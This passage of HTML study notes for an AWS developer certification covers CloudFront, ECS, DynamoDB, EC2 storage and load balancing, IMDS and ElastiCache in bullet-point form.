<li><a href="#cloudfront-signed-url-1">CloudFront Signed URL</a></li>
<li><a href="#pricing-1">Pricing</a></li>
</ul>
<p><a id="introduction-2"></a></p>
<h2 id="introduction-3"><a class="header" href="#introduction-3">Introduction</a></h2>
<ul>
<li>Content Distribution Network (CDN) creates cached copies of your website at various Edge locations around the world</li>
<li>Content Delivery Network (CDN)
<ul>
<li>A CDN is a distributed network of servers which delivers web pages and content to users based on their geographical location, the origin of the webpage and a content delivery server
<ul>
<li>Can be used to deliver an entire website including static, dynamic and streaming</li>
<li>216 points of presence globally</li>
<li>DDoS protection since it is a global service. Integrates with AWS Shield and AWS WAF</li>
<li>Requests for content are served from the nearest Edge Location for the best possible performance
<img src="clouds/aws/dva-c02/images/CDN.jpg" width="77%" height="40%" /></li>
</ul>
</li>
</ul>
</li>
</ul>
<p><a id="cloudfront-core-components"></a></p>
<h2 id="cloudfront-core-components-1"><a class="header" href="#cloudfront-core-components-1">CloudFront Core Components</a></h2>
<ul>
<li><b> Origin </b>
<ul>
<li>The location where all of original files are located. For example an S3 Bucket, EC2 Instance, ELB or Route53</li>
</ul>
</li>
<li><b> Edge Location </b>
<ul>
<li>The location where web content will be cached. This is different than an AWS Region or AZ</li>
</ul>
</li>
<li><b> Distribution </b>
<ul>
<li>A collection of Edge locations which defines how cached content should behave
<img src="clouds/aws/dva-c02/images/cloudfront-core-components.jpg" width="77%" height="40%" /></li>
</ul>
</li>
</ul>
<p><a id="cloudfront-distributions"></a></p>
<h2 id="cloudfront-distributions-1"><a class="header" href="#cloudfront-distributions-1">CloudFront Distributions</a></h2>
<ul>
<li>A distribution is a collection of Edge Location. You specific the Origin eg. S3, EC2, ELB, Route53</li>
<li>It replicates copies based on your Price Class</li>
<li>There are two types of Distributions
<ol>
<li>Web (for Websites)</li>
<li>RTMP (for streaming media)</li>
</ol>
</li>
<li><b> Behaviors </b>
<ul>
<li>Redirect to HTTPs, Restrict HTTP Methods, Restrict Viewer Access, Set TTLs</li>
</ul>
</li>
<li><b> Invalidations </b>
<ul>
<li>You can manually invalidate cache on specific files via Invalidations</li>
</ul>
</li>
<li><b> Error Pages </b>
<ul>
<li>You can serve up custom error pages eg 404</li>
</ul>
</li>
<li><b> Restrictions </b>
<ul>
<li>You can use Geo Restriction to blacklist or whitelist specific countries</li>
</ul>
</li>
</ul>
<p><a id="lambdaedge"></a></p>
<h2 id="lambdaedge-1"><a class="header" href="#lambdaedge-1">Lambda@Edge</a></h2>
<ul>
<li>
<p>Lambda@Edge functions are used to override the behavior of request and responses</p>
</li>
<li>
<p>Lambda@Edge lets you run Lambda functions to customize the content that CloudFront delivers, executing the functions in AWS locations closer to the viewer.</p>
</li>
<li>
<p>The functions run in response to CloudFront events, without provisioning or managing servers. You can use Lambda functions to change CloudFront requests and responses at the following points:</p>
</li>
<li>
<p>The 4 Available Edge Functions</p>
<ol>
<li>Viewer Request
<ul>
<li>When CloudFront receives a request from a Viewer</li>
</ul>
</li>
<li>Origin request
<ul>
<li>Before CLoudFront forwards a request to the origin</li>
</ul>
</li>
<li>Origin response
<ul>
<li>When cloudfront receives a response from the origin</li>
</ul>
</li>
<li>Viewer response
<ul>
<li>Before CLoudFront returns the response to the viewer</li>
</ul>
</li>
</ol>
  <img src="clouds/aws/dva-c02/images/lambda.jpg" width="47%" />
  <img src="clouds/aws/dva-c02/images/Lamda@edge.jpg" width="47%" />
</li>
</ul>
<p><a id="cloudfront-protection"></a></p>
<h2 id="cloudfront-protection-1"><a class="header" href="#cloudfront-protection-1">CloudFront Protection</a></h2>
<ul>
<li>By Default a Distribution allows everyone to have access</li>
<li>Original Identity Access (OAI)
<ul>
<li>A virtual user identity that will be used to give your CloudFront Distribution permission to fetch a private object</li>
</ul>
</li>
<li>Inorder to use Signed URLs or Signed Cookies you need to have an OAI</li>
<li><b> Signed URLs </b>
<ul>
<li>(Not the same thing as S3 Presigned URL)
<ul>
<li>A url with provides temporary access to cached objects</li>
</ul>
</li>
</ul>
</li>
<li><b> Signed Cookies </b>
<ul>
<li>A cookie which is passed along with the request to CloudFront. The advantage of using a Cookie is you want to provide access to multiple restricted files. eg. Video Streaming</li>
</ul>
</li>
</ul>
<p><a id="caching-policy"></a></p>
<h2 id="caching-policy-1"><a class="header" href="#caching-policy-1">Caching Policy</a></h2>
<ul>
<li>Each object in the cache will be identified by a cache key</li>
<li>Maximize the cache-hit-ratio by minimizing requests to the origin</li>
<li>Cache Key
<ul>
<li>a unique identifier for everything in the cache</li>
<li>by default, made up of the hostname and resource portion of the URL</li>
<li>The cache key can be customized by creating a CloudFront Cache Policy</li>
</ul>
</li>
</ul>
<p><a id="caching-behaviors"></a></p>
<h2 id="caching-behaviors-1"><a class="header" href="#caching-behaviors-1">Caching Behaviors</a></h2>
<ul>
<li>Configure different settings for a given URL path pattern</li>
<li>Example: configure a specific behavior for requests to /images/*.jpg</li>
<li>Route to different kinds of origins/origin groups based on the content-type or path.</li>
<li>Examples:
<ul>
<li>/images/* to S3</li>
<li>/login to EC2</li>
<li>/api to API Gateway</li>
</ul>
</li>
</ul>
<p><a id="geo-restriction"></a></p>
<h2 id="geo-restriction-1"><a class="header" href="#geo-restriction-1">Geo-Restriction</a></h2>
<ul>
<li>Restrict who can access your CloudFront distribution based on the country where the distribution was access from</li>
<li>You can create an AllowList or a BlockList</li>
</ul>
<p><a id="cloudfront-signed-url"></a></p>
<h2 id="cloudfront-signed-url-1"><a class="header" href="#cloudfront-signed-url-1">CloudFront Signed URL</a></h2>
<ul>
<li>Two types of signers:
<ul>
<li>Either a trusted key group (Recommended)</li>
<li>An AWS Account that contains a CloudFront Key Pair</li>
</ul>
</li>
<li>In your distribution, create one or more trusted key groups</li>
</ul>
<p><a id="pricing"></a></p>
<h2 id="pricing-1"><a class="header" href="#pricing-1">Pricing</a></h2>
<ul>
<li>You can reduce the number of edge locations for a cost savings</li>
<li>Price Classes
<ul>
<li>Price Class All: All regions, best performance</li>
<li>Price Class 200: most regions, but excludes the most expensive regions</li>
<li>Price Class 100: only the least expensive regions</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="copilot"><a class="header" href="#copilot">Copilot</a></h1>
<h2 id="introduction-4"><a class="header" href="#introduction-4">Introduction</a></h2>
<ul>
<li>CLI tool to build, release, and maintain production ready containerized apps</li>
<li>Helps you focus on building apps rather than setting up infrastructure</li>
<li>Automatically provisions all required infrastructure for a containerized app</li>
<li>Automate deployments using one command with CodePipeline</li>
<li>Deploy to ECS, Fargate, or App Runner</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="elastic-container-registry"><a class="header" href="#elastic-container-registry">Elastic Container Registry</a></h1>
<h2 id="introduction-5"><a class="header" href="#introduction-5">Introduction</a></h2>
<ul>
<li>Store container images in AWS, similar to DockerHub</li>
<li>Public or Private</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="elastic-container-service"><a class="header" href="#elastic-container-service">Elastic Container Service</a></h1>
<h2 id="introduction-6"><a class="header" href="#introduction-6">Introduction</a></h2>
<ul>
<li>Launch container instances on AWS as ECS Tasks</li>
<li>Launch Types:
<ul>
<li>EC2: You must provision and manage the infrastructure (EC2 instances)
<ul>
<li>Each EC2 instance must run the ECS Agent to register in the ECS cluster</li>
</ul>
</li>
<li>
<h2 id="fargate-aws-provisions-and-manages-the-infrastructure"><a class="header" href="#fargate-aws-provisions-and-manages-the-infrastructure">Fargate: AWS provisions and manages the infrastructure</a></h2>
</li>
</ul>
</li>
</ul>
<h2 id="iam-roles-for-ecs"><a class="header" href="#iam-roles-for-ecs">IAM Roles for ECS</a></h2>
<ul>
<li>EC2 Instance Profile
<ul>
<li>Used by the ECS agent to make API calls to ECS Service, send container logs to CloudWatch, pull docker images from ECR, etc.</li>
</ul>
</li>
<li>ECS Tasks:
<ul>
<li>Each ECS tasks gets a role. Applies to both EC2 and Fargate launch types</li>
<li>Task role is defined in the Task Definition</li>
</ul>
</li>
</ul>
<h2 id="load-balancer-integrations"><a class="header" href="#load-balancer-integrations">Load Balancer Integrations</a></h2>
<ul>
<li>ALB supports and works for most use cases</li>
<li>NLB is recommended only for high-throughput use cases</li>
</ul>
<h2 id="data-volumes"><a class="header" href="#data-volumes">Data Volumes</a></h2>
<ul>
<li>Mount EFS file systems onto ECS Tasks</li>
<li>Works for both EC2 and Fargate Launch Types</li>
<li>Tasks running in any AZ will share the same data in the EFS file system</li>
<li>EFS + Fargate = serverless</li>
<li>S3 cannot be mounted on a file system in your ECS Tasks</li>
</ul>
<h2 id="ecs-service-auto-scaling"><a class="header" href="#ecs-service-auto-scaling">ECS Service Auto-scaling</a></h2>
<ul>
<li>You can scale on 3 metrics
<ul>
<li>CPU</li>
<li>Memory</li>
<li>ALB Request Count</li>
</ul>
</li>
<li>Types of Scaling:
<ul>
<li>Target Tracking: scale based on target value for a specific CloudWatch metric</li>
<li>Step Scaling: scale based on a specified CloudWatch Alarm</li>
<li>Scheduled Scaling: scale based on a specified date/time</li>
</ul>
</li>
<li>Auto Scaling EC2 instances
<ul>
<li>Use an Auto Scaling Group
<ul>
<li>Scale based on CPU usage</li>
</ul>
</li>
<li>ECS Cluster Capacity Provider
<ul>
<li>Used to automatically provision and scale the infrastructure of your ECS Tasks</li>
<li>Capacity Provider is paired with an auto-scaling group</li>
<li>Add EC2 instances when you are out of usable capacity (CPU, RAM, etc‚Ä¶)</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="ecs-rolling-updates"><a class="header" href="#ecs-rolling-updates">ECS Rolling Updates</a></h2>
<ul>
<li>When updating versions of an ECS service, we can control how many tasks can be started and stopped, and in which order</li>
<li>Rolling Updates</li>
</ul>
<h2 id="ecs-tasks-definitions"><a class="header" href="#ecs-tasks-definitions">ECS Tasks Definitions</a></h2>
<ul>
<li>Tasks definitions are metadata in JSON form to tell ECS how to run a container</li>
<li>How can we add environment variables to an ECS Task?
<ul>
<li>Hardcoded - URLs for example</li>
<li>SSM Parameter Store - sensitive variables such as API keys</li>
<li>Secrets Manager - Sensitive variables</li>
</ul>
</li>
<li>Bind mounts</li>
<li>Essential Container
-If enabled: If one container in the task fails or stops, all the other containers in the task will stop</li>
</ul>
<h2 id="ecs-task-placement"><a class="header" href="#ecs-task-placement">ECS Task Placement</a></h2>
<ul>
<li>
<p>When a Task Definition for EC2 is created, ECS must determine where to schedule it</p>
</li>
<li>
<p>When a service scales in, ECS must determine which tasks to kill</p>
</li>
<li>
<p>To help with this, you can define a task placement strategy and task placement constraint</p>
</li>
<li>
<p>Task placement strategies and constraints <b>only work on EC2 launch types</b></p>
</li>
<li>
<p>How does this work?</p>
<ul>
<li>ECS will first determine where it is possible to place the task. Which nodes have enough resources?</li>
<li>ECS will then determine which EC2 instances satisfy the task placement constraints</li>
<li>ECS will then determine which EC2 instances satisfy the task placement strategy</li>
<li>ECS will then schedule the task</li>
</ul>
</li>
<li>
<p>Task Placement Strategies</p>
<ul>
<li>BinPack: Schedule tasks based on the least available amount of CPU or memory
<ul>
<li>i.e. <b>pack</b> as many containers as possible on a node before scheduling containers on other nodes</li>
</ul>
</li>
<li>Random: Place the task randomly</li>
<li>Spread: Spread instances across nodes based on a specified value (AZ, instanceId, etc.)</li>
</ul>
</li>
<li>
<p>Task Placement Constraints</p>
<ul>
<li>distinctInstance: Each task should be placed on a separate EC2 instance</li>
<li>memberOf: Schedule tasks on instances that satisfy an expression written in cluster query language ()</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="dynamodb"><a class="header" href="#dynamodb">Dynamodb</a></h1>
<h2 id="introduction-7"><a class="header" href="#introduction-7">Introduction</a></h2>
<ul>
<li>Fully managed, highly available with replication across AZs</li>
<li>NoSQL Database</li>
<li>Scales to massive workloads, highly distributed database</li>
<li>Fully integrates with IAM</li>
<li>Enable event driven programming with DynamoDB streams</li>
</ul>
<h2 id="basics-1"><a class="header" href="#basics-1">Basics</a></h2>
<ul>
<li>DynamoDB is made of tables</li>
<li>Each table will have primary key (must be decided at creation time)</li>
<li>Each table can have an infinite number of rows (rows are items)
<ul>
<li>Each row can have a max of 400KB of data</li>
</ul>
</li>
</ul>
<h2 id="primary-keys"><a class="header" href="#primary-keys">Primary keys</a></h2>
<ul>
<li>how to choose a primary key?</li>
<li>Two types of primary keys
<ul>
<li>partition keys
<ul>
<li>Partition key must be unique for each item</li>
<li>Partition key must be ‚Äòdiverse‚Äô so that data is distributed</li>
</ul>
</li>
<li>partition key + sort key
<ul>
<li>data is grouped by partition key</li>
<li>each combination must be unique per item</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="readwrite-capacity-modes"><a class="header" href="#readwrite-capacity-modes">Read/Write Capacity Modes</a></h2>
<ul>
<li>Provisioned Mode
<ul>
<li>Provision all capacity in advance by providing values for RCU and WCU</li>
<li>Pay up front</li>
<li>Throughput can temporarily be exceeded using a burst capacity</li>
<li>If you exhaust the burst capacity, you can retry using exponential backoff</li>
</ul>
</li>
<li>On-demand Mode
<ul>
<li>Reads/writes scale on-demand</li>
<li>Pay for what you use</li>
</ul>
</li>
<li>You can switch between the two modes once every 24 hours</li>
</ul>
<h2 id="local-secondary-index"><a class="header" href="#local-secondary-index">Local Secondary Index</a></h2>
<ul>
<li>Alternate sort key for your table</li>
<li>Must be defined at table creation time</li>
<li>Up to 5 local secondary indexes per table</li>
<li>The sort key consists of one scaler attribute (string, number, or binary)</li>
</ul>
<h2 id="global-secondary-index"><a class="header" href="#global-secondary-index">Global Secondary Index</a></h2>
<ul>
<li>Alternative primary key from the base table</li>
</ul>
<h2 id="partiql"><a class="header" href="#partiql">PartiQL</a></h2>
<ul>
<li>Use SQL-like syntax to query DynamoDB tables</li>
</ul>
<h2 id="optimistic-locking"><a class="header" href="#optimistic-locking">Optimistic Locking</a></h2>
<ul>
<li>DynamoDB has a feature called ‚Äúconditional writes‚Äù to ensure an item has not changed before writing to it</li>
<li>Each item has an attribute that acts as a version number</li>
<li>Useful for when you have multiple writers attempters to write to an item</li>
</ul>
<h2 id="dynamodb-accelerator-dax"><a class="header" href="#dynamodb-accelerator-dax">DynamoDB Accelerator (DAX)</a></h2>
<ul>
<li>Fully managed, highly available, seamless in-memory cache for DynamoDB</li>
<li>Microseconds latency for cached reads and queries</li>
<li>Does not require that you change any application code</li>
<li>Solves the ‚Äúhot key‚Äù problem. If you read a specific key (item) too many times, you may get throttled.</li>
<li>5 minutes TTL for cache (default)</li>
<li>Up to 10 DAX nodes per cluster</li>
<li>Multi-AZ (3 nodes minimum recommended for production)</li>
<li>Secure (Encryption in transit and at rest)</li>
</ul>
<h2 id="dynamodb-streams"><a class="header" href="#dynamodb-streams">DynamoDB Streams</a></h2>
<ul>
<li>Streams are an ordered item-level modifications (create/update/delete) in a table</li>
<li>Stream records can be:
<ul>
<li>Sent to Kinesis Data Streams</li>
<li>Read by AWS Lambda</li>
<li>Read by Kinesis Client Library Apps</li>
</ul>
</li>
<li>Data retention for up to 24 hours</li>
<li>Use cases:
<ul>
<li>react to changes in real-time</li>
<li>Analytics</li>
<li>Insert into derivative tables</li>
<li>Insert into OpenSearch service</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="ec2"><a class="header" href="#ec2">EC2</a></h1>
<h2 id="table-of-contents-1"><a class="header" href="#table-of-contents-1">Table of Contents</a></h2>
<ul>
<li><a href="#introduction-8">Introduction</a></li>
<li><a href="#budgets">Budgets</a></li>
<li><a href="#instance-types-1">Instance Types</a></li>
<li><a href="#security-groups-1">Security Groups</a></li>
<li><a href="#ec2-purchasing-options">EC2 Purchasing Options</a></li>
<li><a href="#ebs-volumes">EBS Volumes</a></li>
<li><a href="#ebs-volume-snapshots">EBS Volume Snapshots</a></li>
<li><a href="#ami-aws-machine-image">AMI (AWS Machine Image)</a></li>
<li><a href="#ec2-instance-store">EC2 Instance Store</a></li>
<li><a href="#ebs-volume-types">EBS Volume Types</a></li>
<li><a href="#ebs-multi-attach">EBS Multi-attach</a></li>
<li><a href="#efs">EFS</a></li>
<li><a href="#elastic-load-balancer-elb">Elastic Load Balancer (ELB)</a></li>
<li><a href="#autoscaling-groups">Autoscaling Groups</a></li>
<li><a href="#imds">IMDS</a></li>
</ul>
<p><a id="Introduction"></a></p>
<h2 id="introduction-8"><a class="header" href="#introduction-8">Introduction</a></h2>
<ul>
<li>EC2 is Amazon‚Äôs Elastic Compute Cloud</li>
<li>It is comprised of virtual machines, storage, load balancers, auto scaling VMs</li>
<li>You can run Windows, Linux, or MacOS</li>
<li>You can choose how many vCPUs and how much RAM you want</li>
<li>You can choose how much storage space you want</li>
<li>You can choose what type of network card and whether or not you need a public IP (Elastic IP)</li>
<li>You can run a bootstrap script at launch time called ‚Äúuser data‚Äù. The script is only run once when the instance first starts.</li>
<li>You can configure firewall rules via a Security Group</li>
</ul>
<p><a id="Budgets"></a></p>
<h2 id="budgets"><a class="header" href="#budgets">Budgets</a></h2>
<ul>
<li>You can create a budget and alert to ensure you don‚Äôt go over a certain cost</li>
<li>You need to enable ‚ÄúIAM user and role access to Billing information‚Äù in your account settings</li>
</ul>
<p><a id="instance-types"></a></p>
<h2 id="instance-types-1"><a class="header" href="#instance-types-1">Instance Types</a></h2>
<ul>
<li>General Purpose
<ul>
<li>Balance between compute, memory, and networking</li>
<li>Great for diversity of workloads such as web servers or code repositories</li>
</ul>
</li>
<li>Compute Optimized
<ul>
<li>Optimized for compute intensive tasks</li>
<li>Examples: Machine Learning, batch processing, HPC, etc.</li>
</ul>
</li>
<li>Memory Optimized
<ul>
<li>Optimized for memory intensive tasks</li>
<li>High performance databases or caches</li>
</ul>
</li>
<li>Storage Optimized
<ul>
<li>Example use cases: OLTP, databases, caches, etc.</li>
</ul>
</li>
<li>Accelerated Computing
<ul>
<li>HPC</li>
</ul>
</li>
</ul>
<p>Example:</p>
<pre><code>m5.2xlarge
| |   |
| |   +-- 2xlarge: size within instance class
| +------ 5: generation
+--------- m: instance class
</code></pre>
<p><a id="security-groups"></a></p>
<h2 id="security-groups-1"><a class="header" href="#security-groups-1">Security Groups</a></h2>
<ul>
<li>Security groups are like a firewall scoped to the EC2 instance</li>
<li>Security groups only contain allow rules</li>
<li>Security groups are stateful</li>
<li>Security groups can have a source of IP/range or another security group</li>
<li>An instance can have multiple security groups attached</li>
<li>A security group can be attached to multiple instances</li>
<li>Security groups are region-locked</li>
</ul>
<h4 id="ports-to-know-for-the-exam"><a class="header" href="#ports-to-know-for-the-exam">Ports to know for the exam</a></h4>
<ul>
<li>21 = FTP</li>
<li>22 = SSH/sFTP</li>
<li>80 = HTTP</li>
<li>443 = HTTPS</li>
<li>3389 = RDP</li>
<li>5432 - Postgresql</li>
<li>3306 - MySQL / MariaDB</li>
<li>1521 - Oracle</li>
<li>1433 - MSSQL</li>
</ul>
<h2 id="ec2-purchasing-options"><a class="header" href="#ec2-purchasing-options">EC2 Purchasing Options</a></h2>
<ul>
<li>On-Demand
<ul>
<li>Short workload, predictable pricing</li>
<li>Linux or Windows, billed per second. Other operation systems, billed per hour</li>
</ul>
</li>
<li>Reserved
<ul>
<li>1 to 3 years commitment</li>
<li>Used for long workloads</li>
<li>Up to a 72% discount compared to on-demand</li>
<li>Pay upfront, partially upfront, or no upfront</li>
<li>Scoped to a region or zone</li>
<li>You can buy or sell them in the Reserved Instances Marketplace</li>
</ul>
</li>
<li>Savings Plan
<ul>
<li>Up to a 72% discounted compared to on-demand</li>
<li>Commit to a certain type of usage (example: $10/hour for 1 to 3 years). Usage beyond the commitment is billed at the on-demand price</li>
<li>Locked to a specific instance family and AWS region (example: M5 in us-east-1)</li>
<li>1 to 3 years commitment</li>
<li>Commit to an amount of usage</li>
</ul>
</li>
<li>Spot Instances
<ul>
<li>Short workloads, cheap, less reliable</li>
<li>The MOST cost efficient option</li>
<li>Workload must be resilient to failure</li>
</ul>
</li>
<li>Dedicated Hosts
<ul>
<li>Reserve an entire physical server, control instance placement</li>
<li>Allows you to address compliance or license requirements</li>
<li>Purchasing Options:
<ul>
<li>On-demand</li>
<li>Reserved for 1 to 3 years</li>
</ul>
</li>
<li>The most expensive option</li>
</ul>
</li>
<li>Dedicated Instances
<ul>
<li>No other customers will share your hardware</li>
<li>You may share the hardware with other instances in the same account</li>
<li>No control over the instance placement</li>
</ul>
</li>
<li>Capacity Reservation
<ul>
<li>Reserve capacity in a specific AZ for any duration</li>
<li>You always have access to the EC2 capacity when you need it</li>
<li>No time reservations</li>
<li>Combine with regional reserved instances or a savings plan for cost savings</li>
<li>Even if you don‚Äôt launch instances, you still get charged</li>
</ul>
</li>
</ul>
<h2 id="ebs-volumes"><a class="header" href="#ebs-volumes">EBS Volumes</a></h2>
<ul>
<li>AN EBS (Elastic Block Store) Volume is a network drive which you can attach to you instances while they run</li>
<li>EBS volumes are bound to a specific Availability Zone
<ul>
<li>To move an EBS volume to another AZ, you must first snapshot it and then copy the snapshot</li>
</ul>
</li>
<li>EBS volumes have a provisioned capacity
<ul>
<li>You are billed for the provisioned capacity</li>
</ul>
</li>
<li>IOPS typically scale with capacity (i.e. larger volumes have better performance)</li>
<li>EBS volumes have a ‚ÄúDelete on Termination‚Äù attribute. This is enabled for the root volume by default, but not for other volumes</li>
</ul>
<h2 id="ebs-volume-snapshots"><a class="header" href="#ebs-volume-snapshots">EBS Volume Snapshots</a></h2>
<ul>
<li>To move an EBS volume to another AZ, you must first snapshot it and then copy the snapshot</li>
<li>EBS Snapshot Archive
<ul>
<li>Gives you the ability to move snapshots to the archive tier, which is up to 75% cheaper</li>
<li>Takes 24-72 hours to restore the snapshot</li>
</ul>
</li>
<li>EBS Snapshot Recycle Bin
<ul>
<li>Allows you to restore deleted snapshot</li>
<li>Retention can be 1 day to 1 year</li>
</ul>
</li>
<li>Fast Snapshot Restore
<ul>
<li>Force full initialization of snapshot to have to latency on first use</li>
<li>can be very expensive</li>
</ul>
</li>
</ul>
<h2 id="ami-aws-machine-image"><a class="header" href="#ami-aws-machine-image">AMI (AWS Machine Image)</a></h2>
<ul>
<li>
<p>VM Image</p>
</li>
<li>
<p>AMI‚Äôs are built for a specific region and can be copied to other regions</p>
</li>
<li>
<p>AMI Types:</p>
<ul>
<li>Private</li>
<li>Public</li>
<li>MarketPlace</li>
</ul>
</li>
<li>
<p>AMI Creation Process</p>
<ul>
<li>Start instance and customize it</li>
<li>Stop the instance</li>
<li>Capture the AMI</li>
</ul>
</li>
</ul>
<h2 id="ec2-instance-store"><a class="header" href="#ec2-instance-store">EC2 Instance Store</a></h2>
<ul>
<li>Storage mounted in an EC2 instance that is local to the physical host</li>
<li>High performance</li>
<li>The storage is wiped when the EC2 instance stops or is terminated</li>
<li>Use cases: cache, temporary content, or scratch space</li>
</ul>
<h2 id="ebs-volume-types"><a class="header" href="#ebs-volume-types">EBS Volume Types</a></h2>
<ul>
<li>
<p>GP2/GP3 - General SSD</p>
<ul>
<li>1 GB up to 16 TB</li>
</ul>
</li>
<li>
<p>IO1/IO2 - High performance SSD</p>
</li>
<li>
<p>ST1 (hdd) - low cost HDD volume</p>
</li>
<li>
<p>SC1 (hdd) - Lowest cost HDD volume</p>
</li>
<li>
<p>Only GP2/3 and IO1/2 can be used as root (bootable) volumes</p>
</li>
</ul>
<h2 id="ebs-multi-attach"><a class="header" href="#ebs-multi-attach">EBS Multi-attach</a></h2>
<ul>
<li>Attach the same EBS volume to multiple instances (up to 16) in the same AZ</li>
<li>Only available for IO1/IO2 family of EBS volumes</li>
<li>Each instance will have read/write access to the volume</li>
<li>You must use a file system that is cluster aware</li>
</ul>
<h2 id="efs"><a class="header" href="#efs">EFS</a></h2>
<ul>
<li>
<p>Managed NFS (Network File System)</p>
</li>
<li>
<p>Pay per use</p>
</li>
<li>
<p>3x more expensive than a GP2 EBS volume</p>
</li>
<li>
<p>Can be mounted on different EC2 instances in different Availability Zones</p>
</li>
<li>
<p>EFS Scale</p>
<ul>
<li>1000s of concurrent clients, 10 GB+ throughput</li>
<li>Grow to petabyte scale network file system, automatically</li>
<li>Performance Classes:
<ul>
<li>Performance Mode:
<ul>
<li>General purpose: latency sensitive use cases (web server, CMS, etc‚Ä¶)</li>
<li>Max I/O: higher latency, throughput, highly parallel (big data, media processing)</li>
</ul>
</li>
<li>Throughput Mode:
<ul>
<li>Bursting: 1 TB= 50MB/s + burst up to 100MB/s</li>
<li>Provisioned - set your throughput regardless of storage size</li>
<li>Elastic - Automatically scales throughput up or down based on your workloads</li>
</ul>
</li>
</ul>
</li>
<li>Storage Classes:
<ul>
<li>Storage Tiers (move files to another tier after ‚Äòx‚Äô number of days)
<ul>
<li>Standard</li>
<li>Infrequent Access</li>
<li>Archive</li>
</ul>
</li>
<li>Implement lifecycle policies to move files between tiers</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="elastic-load-balancer-elb"><a class="header" href="#elastic-load-balancer-elb">Elastic Load Balancer (ELB)</a></h2>
<ul>
<li>
<p>Load balancers forward traffic to multiple backend servers</p>
</li>
<li>
<p>ELB is a managed load balancer</p>
</li>
<li>
<p>ELB is integrated with many offerings and services ()</p>
</li>
<li>
<p>ELB supports health checks to verify if a backend instance is working before forwarding traffic to it</p>
</li>
<li>
<p>Types of load balancers on AWS:</p>
<ul>
<li>
<p>Application Load Balancer</p>
<ul>
<li>Layer 7
<ul>
<li>Support HTTP2 and WebSockets</li>
</ul>
</li>
<li>Supports HTTP redirects</li>
<li>Supports URL path routing, hostname routing, query string routing, header routing</li>
<li>Backend instances are grouped into a Target Group</li>
<li>You get a fixed hostname</li>
<li>The app servers don‚Äôt see the IP of the client directly
<ul>
<li>If the app servers need to know the client IP/port/protocol, they can check the following headers:
<ul>
<li>X-Forwarded-For</li>
<li>X-Forwarded-Proto</li>
<li>X-Forwarded-Port</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>Network Load Balancer</p>
<ul>
<li>Layer 4
<ul>
<li>Supports UDP and TCP</li>
</ul>
</li>
<li>High performance</li>
<li>One static IP per availability zone</li>
</ul>
</li>
<li>
<p>Gateway Load Balancer</p>
<ul>
<li>Layer 3</li>
<li>Used for 3rd party network appliances on AWS, example: Firewalls</li>
<li>Extremely high performance</li>
<li>Supports the GENEVE protocol</li>
</ul>
</li>
<li>
<p>Target Groups</p>
<ul>
<li>EC2 Instances</li>
<li>ECS Tasks</li>
<li>Lambda Functions</li>
<li>Private IP addresses</li>
</ul>
</li>
<li>
<p>Sticky Sessions</p>
<ul>
<li>
<p>Cookie Names</p>
<ul>
<li>Application-based cookies
<ul>
<li>Custom Cookie
<ul>
<li>Generated by the target</li>
<li>Can include any custom attributes required by the application</li>
<li>Cookie name must be specified individually for each target group</li>
<li>You cannot use AWSALB, AWSALBAPP, or AWSALBTG (these are reserved by the ELB)</li>
</ul>
</li>
<li>Application Cookie
<ul>
<li>Generated by the load balancer</li>
<li>Cookie name is AWSALBAPP</li>
</ul>
</li>
</ul>
</li>
<li>Duration-based Cookie
<ul>
<li>Cookie generated by the load balancer</li>
<li>Cookie name is AWSALB for ALB, AWSELB for CLB</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>Cross-zone load balancing</p>
<ul>
<li>Each load balancer instance distributes traffic evenly across all registered instances in all availability zones</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="autoscaling-groups"><a class="header" href="#autoscaling-groups">Autoscaling Groups</a></h2>
<ul>
<li>Scale out EC2 instances to match increased load or scale in to match a decreased load</li>
<li>Specify parameters to have a minimum and maximum number of instances</li>
<li>Automatically replace failed instances</li>
<li>Uses a launch template</li>
</ul>
<h2 id="imds"><a class="header" href="#imds">IMDS</a></h2>
<ul>
<li>IMDSv1 vs. IMDSv2
<ul>
<li>IMDSv1 is accessing http://169.254.169.254/latest/meta-data directly</li>
<li>IMDSv2 is more secure and is done in two steps
<ol>
<li>get a Session token</li>
<li>Use session token in the IMDSv2 calls</li>
</ol>
</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="elasticache"><a class="header" href="#elasticache">Elasticache</a></h1>
<h2 id="introduction-9"><a class="header" href="#introduction-9">Introduction</a></h2>
<ul>
<li>Fully managed Redis or Memcached instances</li>
<li>Caches are in-memory databases with high-performance and low latency</li>
<li>Helps to reduce load from databases</li>
<li>Helps to make your application stateless</li>
<li>Requires that your application be architected with a cache in-mind</li>
</ul>
<h2 id="redis"><a class="header" href="#redis">Redis</a></h2>
<ul>
<li>Supports multi-AZ with auto-failover</li>
<li>Supports read-replicas to scale out reads</li>
<li>Backup and restore features</li>
<li>Supports sets and sorted sets</li>
</ul>
<h2 id="memcached"><a class="header" href="#memcached">Memcached</a></h2>
<ul>
<li>Multi-node for partitioning of data (Sharding)</li>
<li>None of the features that Redis supports</li>
</ul>
<h2 id="caching-implementation-considerations"><a class="header" href="#caching-implementation-considerations">Caching Implementation Considerations</a></h2>
<ul>
<li>Is it safe to cache the data?
<ul>
<li>Data may be out of date (eventually consistent)</li>
</ul>
</li>
<li>Is caching effective for that data?
<ul>
<li>Patterns: data changing slowly, few keys are frequently updated</li>
<li>Anti patterns: data changing rapidly, all large key space frequently needed</li>
</ul>
</li>
<li>Is data structured for caching?
<ul>
<li>example: key value caching or caching of aggregations result</li>
</ul>
</li>
</ul>
<h2 id="caching-design-patterns"><a class="header" href="#caching-design-patterns">Caching design patterns</a></h2>
<h3 id="lazy-loading--cache-aside--lazy-population"><a class="header" href="#lazy-loading--cache-aside--lazy-population">Lazy Loading / Cache-Aside / Lazy Population</a></h3>
  <img src="clouds/aws/dva-c02/images/caching-1.png" width="77%" height="40%" />
  <img src="clouds/aws/dva-c02/images/caching-2.png" width="77%" height="40%" />
